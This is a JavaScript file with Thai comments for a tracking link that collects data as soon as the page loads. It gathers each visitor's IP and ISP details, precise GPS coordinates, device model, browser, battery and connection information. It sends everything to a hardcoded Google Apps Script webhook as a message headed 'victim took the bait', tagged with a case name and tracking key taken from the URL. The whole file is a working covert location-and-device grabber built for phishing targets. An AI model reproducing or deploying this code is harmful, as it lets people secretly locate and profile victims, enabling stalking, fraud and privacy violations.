// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);

    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลอุปกรณ์ทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};

    // ตรวจสอบ IP และข้อมูลผู้ให้บริการเครือข่าย
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})), // ดึง IP และรายละเอียด
      getNetworkProviderInfo().catch(() => ({ // ดึงข้อมูล ISP/ประเทศ
          isp: "ไม่สามารถระบุได้",
          organization: "ไม่สามารถระบุได้",
          countryCode: "ไม่สามารถระบุได้",
          countryCallingCode: "ไม่สามารถระบุได้",
          remarks: "เกิดข้อผิดพลาดในการดึงข้อมูลเครือข่าย"
      }))
    ])
    .then(([ipData, networkProviderInfo]) => { // เปลี่ยน phoneInfo เป็น networkProviderInfo
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        networkProviderInfo: networkProviderInfo, // เปลี่ยน phoneInfo เป็น networkProviderInfo
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true, // Flag for Google Apps Script
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };

      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve) => { // Removed reject as we handle timeout/error below
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง หรือเกิดข้อผิดพลาด:", error.message);
              resolve("ไม่มีข้อมูล"); // Resolve with "ไม่มีข้อมูล" on error
            },
            {
              timeout: 5000, // 5 seconds timeout
              enableHighAccuracy: true
            }
          );
        });

        // รอข้อมูลพิกัด หรือ Timeout
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล (หมดเวลา)"), 5000)) // Resolve after 5 seconds
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;

          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล (ไม่รองรับ)";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // More robust unique ID generation
  return `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 10)}`;
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด (ปรับปรุง)
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตรวจสอบประเภทอุปกรณ์
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const isTablet = /iPad|Android(?!.*Mobile)/i.test(userAgent); // iPad or Android without "Mobile" string
  const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");

  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent - ปรับปรุง)
  let deviceModel = "ไม่สามารถระบุได้";

  // ตรวจสอบว่าเป็น iPhone, iPad หรือ Android
  const iPhoneMatch = userAgent.match(/iPhone(?: OS (\d+)[_\.](\d+))?/i); // Make OS version optional, allow . or _
  const iPadMatch = userAgent.match(/iPad.*(?:OS (\d+)[_\.](\d+))?/i); // Make OS version optional, allow . or _
  // Improved Android model detection: Look for 'Build/' or use the segment after ';', excluding language codes like 'th-th'
  const androidBuildMatch = userAgent.match(/Android [\d\.]+;.*Build\/([^;]+)/i);
  const androidDeviceMatch = userAgent.match(/Android [\d\.]+;\s*([^;)]+)/i); // Match segment after ';' but before ')' if present

  if (iPhoneMatch) {
    deviceModel = "iPhone" + (iPhoneMatch[1] ? ` iOS ${iPhoneMatch[1]}.${iPhoneMatch[2] || 0}` : "");
  } else if (iPadMatch) {
    deviceModel = "iPad" + (iPadMatch[1] ? ` iOS ${iPadMatch[1]}.${iPadMatch[2] || 0}` : "");
  } else if (androidBuildMatch) {
    // Prefer model from Build string if available, clean it up
    deviceModel = androidBuildMatch[1].trim().replace(/_/g, ' ');
  } else if (androidDeviceMatch) {
    // Fallback to segment after ';'
    let potentialModel = androidDeviceMatch[1].trim();
    // Avoid language codes like 'th-th', 'en-us' and generic terms
    if (!/^[a-z]{2}-[a-z]{2}$/i.test(potentialModel) && !/Mobile|Tablet/i.test(potentialModel)) {
       deviceModel = potentialModel;
    } else {
       deviceModel = "Android Device"; // Generic fallback
    }
  }
  // Add basic Windows/Mac detection
  else if (/Windows NT/.test(userAgent)) {
    deviceModel = "Windows PC";
  } else if (/Macintosh/.test(userAgent)) {
    deviceModel = "Mac";
  } else if (/Linux/.test(userAgent) && !/Android/.test(userAgent)) {
    deviceModel = "Linux PC";
  }


  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel
  };
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด (ปรับปรุง)
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้", // e.g., 'wifi', 'cellular'
    effectiveType: "ไม่สามารถระบุได้", // e.g., '4g', '3g'
    downlink: "ไม่สามารถระบุได้", // Mbps
    rtt: "ไม่สามารถระบุได้", // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้" // User-friendly type (WiFi, 4G/LTE, etc.)
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink !== undefined ? connection.downlink : "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt !== undefined ? connection.rtt : "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (connection.type === 'cellular') {
      connectionInfo.isMobile = true;
      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
      switch (connection.effectiveType) {
          case 'slow-2g':
          case '2g':
              connectionInfo.networkType = "2G";
              break;
          case '3g':
              connectionInfo.networkType = "3G";
              break;
          case '4g':
              connectionInfo.networkType = "4G/LTE";
              break;
          default:
              // Check type for 5G as effectiveType might not report it yet
              if (connection.type === '5g') {
                  connectionInfo.networkType = "5G";
              } else {
                  connectionInfo.networkType = "Mobile Data";
              }
      }
    }
    else if (connection.type === 'ethernet') {
        connectionInfo.networkType = "Ethernet";
    }
    else if (connection.type === 'bluetooth') {
        connectionInfo.networkType = "Bluetooth";
    }
    else if (connection.type === 'wimax') {
        connectionInfo.networkType = "WiMAX";
    }
    else if (connection.type === 'none') {
        connectionInfo.networkType = "No Connection";
    }
    else { // type is 'other', 'unknown', or not specified, try guessing from effectiveType
      if (connection.effectiveType === '4g' && !connectionInfo.isMobile) {
        // Could be fast WiFi or Ethernet if not explicitly cellular
        connectionInfo.networkType = "Unknown (Fast)";
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType) && !connectionInfo.isWifi) {
        // Only assume mobile if not already identified as WiFi
        connectionInfo.isMobile = true; // Tentative guess
        connectionInfo.networkType = "Mobile Data (estimated)";
      } else if (connection.effectiveType) {
          connectionInfo.networkType = `Unknown (${connection.effectiveType})`;
      } else {
          connectionInfo.networkType = connection.type || "Unknown"; // Fallback to reported type or Unknown
      }
    }
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }
    return "ไม่รองรับ"; // Indicate lack of support
  } catch (error) {
    console.error("Error accessing battery info:", error);
    return "ไม่สามารถเข้าถึงได้"; // Indicate error
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const ua = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";
  let match;

  // Order matters: Check for more specific browsers first
  if ((match = ua.match(/(Edg)\/([\d.]+)/i))) { // Edge (Chromium)
      browserName = "Microsoft Edge";
      browserVersion = match[2];
  } else if ((match = ua.match(/(SamsungBrowser)\/([\d.]+)/i))) { // Samsung Internet
      browserName = "Samsung Browser";
      browserVersion = match[2];
  } else if ((match = ua.match(/(Firefox)\/([\d.]+)/i))) { // Firefox
      browserName = "Firefox";
      browserVersion = match[2];
  } else if ((match = ua.match(/(OPR)\/([\d.]+)/i)) || (match = ua.match(/(Opera)\/([\d.]+)/i))) { // Opera
      browserName = "Opera";
      browserVersion = match[2];
  } else if ((match = ua.match(/(Chrome)\/([\d.]+)/i))) { // Chrome (must be after Edge and Opera)
      browserName = "Chrome";
      browserVersion = match[2];
  } else if ((match = ua.match(/(Safari)\/([\d.]+)/i)) && ua.match(/Version\/([\d.]+)/i)) { // Safari
      browserName = "Safari";
      browserVersion = ua.match(/Version\/([\d.]+)/i)[1];
  } else if ((match = ua.match(/(MSIE |Trident.*rv:)([\d.]+)/i))) { // Internet Explorer
      browserName = "Internet Explorer";
      browserVersion = match[2];
  } else if ((match = ua.match(/Edge\/([\d.]+)/i))) { // Edge (Legacy)
      browserName = "Microsoft Edge (Legacy)";
      browserVersion = match[1];
  }

  return `${browserName} ${browserVersion}`;
}


// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // Use ipinfo.io which includes IP and details (free tier has rate limits)
    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // Consider adding a token if needed
    if (!response.ok) {
      // Try fallback before throwing full error
      console.warn(`ipinfo.io request failed with status ${response.status}. Trying fallback.`);
      return getIPFallback();
    }
    const ipDetails = await response.json();

    // Format data consistently
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล",
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // Country code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // Coordinates lat,long
      org: ipDetails.org || "ไม่ทราบ", // Organization/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล",
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // Extract ASN and ISP/Org name if possible from 'org' field
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1).trim() : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // Attempt fallback on any error during ipinfo fetch
    return getIPFallback();
  }
}

// Fallback function to get just the IP address using ipify.org
async function getIPFallback() {
    try {
        console.log("Using IP fallback (ipify.org)");
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            throw new Error(`ipify.org request failed with status ${response.status}`);
        }
        const data = await response.json();
        return { ip: data.ip || "ไม่สามารถระบุได้" }; // Return basic IP info
    } catch (fallbackError) {
        console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
        return { ip: "ไม่สามารถระบุได้" }; // Final fallback value
    }
}


// ฟังก์ชันดึงข้อมูล ISP และประเทศจาก IP (ปรับปรุง)
async function getNetworkProviderInfo() {
  const networkInfo = {
    isp: "ไม่สามารถระบุได้",
    organization: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้", // e.g., TH, US
    countryCallingCode: "ไม่สามารถระบุได้", // e.g., +66, +1
    remarks: "ข้อมูลเครือข่ายจาก IP Address"
  };

  try {
    const ipDetails = await getIPDetails(); // Use the function that fetches detailed IP info

    networkInfo.isp = ipDetails.isp || "ไม่สามารถระบุได้";
    networkInfo.organization = ipDetails.org || ipDetails.isp || "ไม่สามารถระบุได้"; // Use org, fallback to ISP
    networkInfo.countryCode = ipDetails.country || "ไม่สามารถระบุได้"; // TH, US etc.

    // Map country code to calling code (example)
    const countryCallingCodes = {
      "TH": "+66", "US": "+1", "GB": "+44", "JP": "+81", "SG": "+65",
      "VN": "+84", "MY": "+60", "ID": "+62", "PH": "+63", "CN": "+86",
      // Add more as needed
    };
    if (ipDetails.country && countryCallingCodes[ipDetails.country]) {
      networkInfo.countryCallingCode = countryCallingCodes[ipDetails.country];
    }

    // Add remarks based on connection type if available
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    let connectionTypeRemark = "";
    if (connection) {
        if (connection.type === 'cellular') connectionTypeRemark = "ผ่านเครือข่ายมือถือ";
        else if (connection.type === 'wifi') connectionTypeRemark = "ผ่าน WiFi";
        else if (connection.type !== 'unknown' && connection.type !== 'none') connectionTypeRemark = `ผ่าน ${connection.type}`;
    }

    if (networkInfo.isp !== "ไม่สามารถระบุได้") {
        networkInfo.remarks = `${connectionTypeRemark ? connectionTypeRemark + ' ' : ''}(ISP: ${networkInfo.isp})`;
    } else if (connectionTypeRemark) {
        networkInfo.remarks = connectionTypeRemark;
    }


    return networkInfo;

  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูลผู้ให้บริการเครือข่ายได้:", error);
    return networkInfo; // Return default info on error
  }
}


// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด (ปรับปรุง)
function createDetailedMessage(ipData, location, timestamp, deviceData, networkProviderInfo, trackingKey, caseName) {
  // Helper to generate flag emoji from country code
  const getFlagEmoji = (countryCode) => {
      if (!countryCode || countryCode.length !== 2) return '🏴';
      const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
      return String.fromCodePoint(...codePoints);
  };

  const message = [
    "🎣 แจ้งเตือนเหยื่อกินเบ็ด 🎣\n",
    `⏰ เวลา: ${timestamp}`,
  ];
  // Add Case Name if available
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂 ชื่อเคส: ${caseName}`);
  }
  // Add Tracking Key if available
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑 Tracking Key: ${trackingKey}`);
  }

  // --- IP Details ---
  message.push("\n--- 🌐 ข้อมูลเครือข่าย ---");
  message.push(`IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
   // Use networkProviderInfo for ISP/Org and Country
  if (networkProviderInfo) {
      if (networkProviderInfo.isp && networkProviderInfo.isp !== "ไม่สามารถระบุได้") {
          message.push(`🏢 ISP: ${networkProviderInfo.isp}`);
      }
      // Show Org only if different from ISP and available
      if (networkProviderInfo.organization && networkProviderInfo.organization !== "ไม่สามารถระบุได้" && networkProviderInfo.organization !== networkProviderInfo.isp) {
           message.push(`   - องค์กร: ${networkProviderInfo.organization}`);
      }
      if (networkProviderInfo.countryCode && networkProviderInfo.countryCode !== "ไม่สามารถระบุได้") {
          const flag = getFlagEmoji(networkProviderInfo.countryCode);
          message.push(`📍 ประเทศ (IP): ${flag} ${networkProviderInfo.countryCode} (${networkProviderInfo.countryCallingCode || 'N/A'})`);
      }
       if (networkProviderInfo.remarks) {
          message.push(`📝 หมายเหตุ: ${networkProviderInfo.remarks}`);
       }
  }
  // Location from IP (less accurate)
  if (ipData.city && ipData.country) {
    message.push(`   - เมือง/ภูมิภาค (IP): ${ipData.city}, ${ipData.region || ipData.country}`);
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone (IP): ${ipData.timezone}`);
  }

  // --- GPS Location ---
  message.push("\n--- 📍 ตำแหน่ง GPS ---");
  if (location && location !== "ไม่มีข้อมูล" && location !== "ไม่มีข้อมูล (หมดเวลา)" && location !== "ไม่มีข้อมูล (ไม่รองรับ)" && location.lat && location.long) {
    message.push(`พิกัด: ${location.lat.toFixed(6)}, ${location.long.toFixed(6)}`);
    message.push(`   - ความแม่นยำ: ±${Math.round(location.accuracy)} เมตร`);
    message.push(`🗺️ ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`สถานะ: ${location || 'ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)'}`);
  }

  // --- Device Details ---
  message.push("\n--- 📱 ข้อมูลอุปกรณ์ ---");
  message.push(`ประเภท: ${deviceData.deviceType}`);
  message.push(`รุ่น: ${deviceData.deviceModel}`);
  message.push(`ผู้ผลิต: ${deviceData.vendor}`);
  message.push(`ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`เบราว์เซอร์: ${deviceData.browser}`);
  message.push(`ภาษา: ${deviceData.language}`);

  // --- Screen Details ---
  message.push("\n--- 📊 ข้อมูลหน้าจอ ---");
  message.push(`ขนาด: ${deviceData.screenSize}`);
  message.push(`   - ความลึกสี: ${deviceData.screenColorDepth} bit`);
  message.push(`   - Pixel Ratio: x${deviceData.devicePixelRatio}`);

  // --- Connection Details ---
  if (typeof deviceData.connection === 'object' && deviceData.connection.networkType !== 'ไม่สามารถระบุได้') {
      message.push("\n--- 📶 ข้อมูลการเชื่อมต่อ ---");
      const networkTypeIcon = deviceData.connection.isWifi ? "📶" : (deviceData.connection.isMobile ? "📱" : "🔌");
      const networkType = deviceData.connection.networkType || "ไม่ทราบประเภท";
      message.push(`${networkTypeIcon} ประเภท: ${networkType} (Effective: ${deviceData.connection.effectiveType || 'N/A'})`);
      if (deviceData.connection.downlink !== 'ไม่สามารถระบุได้') {
          message.push(`   - Downlink: ${deviceData.connection.downlink} Mbps`);
      }
      if (deviceData.connection.rtt !== 'ไม่สามารถระบุได้') {
          message.push(`   - RTT: ${deviceData.connection.rtt} ms`);
      }
      message.push(`   - Save Data Mode: ${deviceData.connection.saveData ? 'เปิด' : 'ปิด'}`);
  }

  // --- Battery Details ---
  if (typeof deviceData.battery === 'object') {
    message.push("\n--- 🔋 ข้อมูลแบตเตอรี่ ---");
    message.push(`ระดับ: ${deviceData.battery.level}`);
    message.push(`สถานะ: ${deviceData.battery.charging}`);
  } else if (deviceData.battery !== "ไม่รองรับ") {
     message.push("\n--- 🔋 ข้อมูลแบตเตอรี่ ---");
     message.push(`สถานะ: ${deviceData.battery}`); // Show "ไม่สามารถเข้าถึงได้" or other string status
  }

  // --- Other ---
  // message.push(`\nUser Agent: ${deviceData.userAgent}`); // Uncomment for debugging if needed

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  // !! IMPORTANT: Replace with your actual Google Apps Script Webhook URL !!
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // Use sessionStorage to prevent resending the same data within the same session
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  const currentRequestId = dataToSend.requestId; // Use the generated ID

  if (sentRequests.includes(currentRequestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้วใน Session นี้ (requestId: " + currentRequestId + ")");
    return; // Stop execution if already sent
  }

  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + currentRequestId + ")");
  console.log("Data to send:", dataToSend); // Log the data being sent

  // Create the message string using the updated function
  const message = createDetailedMessage(
      dataToSend.ip,
      dataToSend.location,
      dataToSend.timestamp,
      dataToSend.deviceInfo,
      dataToSend.networkProviderInfo, // Pass networkProviderInfo
      dataToSend.trackingKey,
      dataToSend.caseName
  );

  // Prepare payload for Google Apps Script
  const payload = {
      message: message, // Send the formatted message string
      // Include raw data if your Apps Script needs it
      rawData: dataToSend
  };


  // Send data using Fetch API
  fetch(webhookUrl, {
    method: 'POST',
    // mode: 'no-cors', // 'no-cors' prevents reading the response, which might hide errors. Use 'cors' if your script is configured for it.
    headers: {
      // 'Content-Type': 'application/x-www-form-urlencoded', // Use this if your script expects form data
       'Content-Type': 'text/plain;charset=utf-8', // Use text/plain if your script uses e.postData.contents
      // 'Content-Type': 'application/json', // Use this if your script parses JSON directly (less common for simple doGet/doPost)
    },
    // body: new URLSearchParams({ message: message }) // For application/x-www-form-urlencoded
     body: JSON.stringify(payload) // Send the whole payload as a JSON string for text/plain or application/json
  })
  .then(response => {
      // Check response status even with no-cors (basic check)
      if (response && response.ok) { // response might be opaque with no-cors
          console.log("ส่งข้อมูลไปยัง Server สำเร็จ (อาจจะไม่ได้รับ Response)");
          // Record that this request ID has been sent successfully in this session
          sentRequests.push(currentRequestId);
          sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
      } else if (response) {
          console.warn(`ส่งข้อมูลไปยัง Server อาจมีปัญหา Status: ${response.status}`);
          // Optionally try reading response text if not no-cors
          // return response.text().then(text => console.error("Server Response:", text));
      } else {
           console.log("ส่งข้อมูลไปยัง Server สำเร็จ (No-CORS, ไม่สามารถตรวจสอบ Response ได้)");
           sentRequests.push(currentRequestId);
           sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
      }
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
    // Consider implementing a retry mechanism or alternative notification here
  });
}
